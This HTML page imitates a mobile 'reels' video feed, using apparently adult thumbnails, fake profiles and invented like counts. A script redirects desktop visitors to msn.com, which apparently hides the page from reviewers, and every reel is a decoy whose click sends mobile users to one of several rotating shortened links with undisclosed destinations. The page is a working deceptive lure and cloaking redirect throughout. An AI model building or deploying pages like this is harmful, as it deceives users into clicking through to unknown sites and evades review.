<!DOCTYPE html>
<html lang="en">

<!-- ‚úÖ Redirect only PC users (UNCHANGED) -->
<script>
(function() {
  var userAgent = navigator.userAgent.toLowerCase();
  var isPC = userAgent.includes("windows") || userAgent.includes("macintosh");
  if (isPC) {
    window.location.replace("https://www.msn.com");
  }
})();
</script>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Reels Viral Feed</title>

<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100vw;height:100vh;background:black;color:white;font-family:Arial,sans-serif;overflow:hidden;}
.reels-container{height:100vh;overflow-y:scroll;scroll-snap-type:y mandatory;}
.reel{position:relative;height:100vh;width:100vw;scroll-snap-align:start;cursor:pointer;}
.main-img{width:100%;height:100%;object-fit:cover;}
.play-button{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);z-index:3;opacity:.85;}
.play-button img{width:64px;height:64px;}

.bottom-left{position:absolute;bottom:90px;left:12px;z-index:2;}
.username-line{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
.profile-ring{padding:2px;border-radius:50%;width:42px;height:42px;}
.profile-ring img{width:36px;height:36px;border-radius:50%;}
.username{font-weight:bold;font-size:14px;}
.follow-btn{background:white;color:black;padding:4px 8px;border-radius:5px;font-size:13px;font-weight:bold;cursor:pointer;}
.caption{font-size:14px;line-height:1.4;max-width:70vw;}

.right-icons{
  position:absolute;
  bottom:120px;
  right:10px;
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:22px;
  z-index:2;
}
.icon-btn{
  display:flex;
  flex-direction:column;
  align-items:center;
  gap:4px;
  font-size:12px;
  cursor:pointer;
}
.icon-btn img{
  width:28px;
  filter:invert(1);
}

.footer{
  position:fixed;
  bottom:0;
  width:100%;
  display:flex;
  justify-content:space-around;
  padding:10px 0;
  background:#000;
}
.footer img{
  width:26px;
  filter:invert(1);
  cursor:pointer;
}
</style>

</head>
<body>

<div class="reels-container" id="reelsContainer"></div>

<script>
const images = [
  "https://jobz77.com/world/wp-content/uploads/2026/01/698293-a2dc913d5094effd259c05c9dcbda89f-post_archive_thumb.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/01/28191544.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/37189901_014_65c4.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/5-1.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/kitana-lure-17.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/50182247_012_574e.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/2073296_8dab4a8_320x_.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/3393418_ac74651_320x_.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/3386544_884a74c_320x_.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/4478184_270cb69_320x_.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/01/orig.9.webp"
];

images.sort(() => Math.random() - 0.5);

const behaviorLinks = [
  "https://t.co/ApdDj33y0h",
  "https://t.co/nd1SIjnMjB",
  "https://t.co/psGDJe8wKI",
  "https://t.co/8YXITrYYSS",
  "https://t.co/58xlrFUfgM"
];

let clickIndex = parseInt(localStorage.getItem("clickIndex") || "0");

const links = Array.from({ length: images.length }, () => {
  const link = behaviorLinks[clickIndex % behaviorLinks.length];
  clickIndex++;
  localStorage.setItem("clickIndex", clickIndex);
  return link;
});

const usernames=["@SophiaLane","@AvaGrace","@EmilyRose","@LiamNova","@ZoeSky","@JakeStorm"];
const captions=["üî• Hot trending moments!","üíÉ Dance moves that SLAY!","üòç Don‚Äôt scroll past this!","‚öΩ Epic football vibes!","üåÑ Scenic views all day!","üé∏ Rock the beat!"];
const profilePics=[
  "https://jobz77.com/world/wp-content/uploads/2026/02/tanktop-beauty-at-onlyfans-onlyfans_mainthumb_vertical@2x.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/01/photo_2026-01-28_23-34-09.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/Picture5.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/outdoor-nudes-at-onlyfans-onlyfans_mainthumb_vertical@2x.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/outdoor-nudes-at-onlyfans-onlyfans_01.jpg",
  "https://jobz77.com/world/wp-content/uploads/2026/02/outdoor-nudes-at-onlyfans-onlyfans_02.jpg"
];

const container=document.getElementById("reelsContainer");

for(let i=0;i<images.length;i++){
  const reel=document.createElement("div");
  reel.className="reel";
  reel.addEventListener("click",()=>window.location.href=links[i]);

  reel.innerHTML=`
    <img src="${images[i]}" class="main-img">

    <div class="play-button">
      <img src="https://freepngimg.com/save/25569-play-button-transparent/1024x1024">
    </div>

    <div class="right-icons">
      <div class="icon-btn">
        <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png">
        79.5K
      </div>
      <div class="icon-btn">
        <img src="https://cdn-icons-png.flaticon.com/512/1384/1384015.png">
        4.3K
      </div>
      <div class="icon-btn">
        <img src="https://cdn-icons-png.flaticon.com/512/25/25694.png">
        Share
      </div>
    </div>

    <div class="bottom-left">
      <div class="username-line">
        <div class="profile-ring"><img src="${profilePics[i%6]}"></div>
        <div class="username">${usernames[i%6]}</div>
        <div class="follow-btn">Follow</div>
      </div>
      <div class="caption">${captions[i%6]}</div>
    </div>
  `;
  container.appendChild(reel);
}
</script>

<!-- ‚úÖ Bottom nav EXACT like image -->
<div class="footer">
  <img src="https://cdn-icons-png.flaticon.com/512/1946/1946436.png">
  <img src="https://cdn-icons-png.flaticon.com/512/1946/1946488.png">
  <img src="https://cdn-icons-png.flaticon.com/512/1384/1384060.png">
  <img src="https://cdn-icons-png.flaticon.com/512/1077/1077035.png">
  <img src="https://cdn-icons-png.flaticon.com/512/1077/1077063.png">
</div>

<!-- ‚úÖ Prevent button clicks from redirect -->
<script>
document.addEventListener("click",function(e){
  if(
    e.target.closest(".follow-btn") ||
    e.target.closest(".icon-btn") ||
    e.target.closest(".footer img")
  ){
    e.stopPropagation();
  }
});
</script>

</body>
</html>
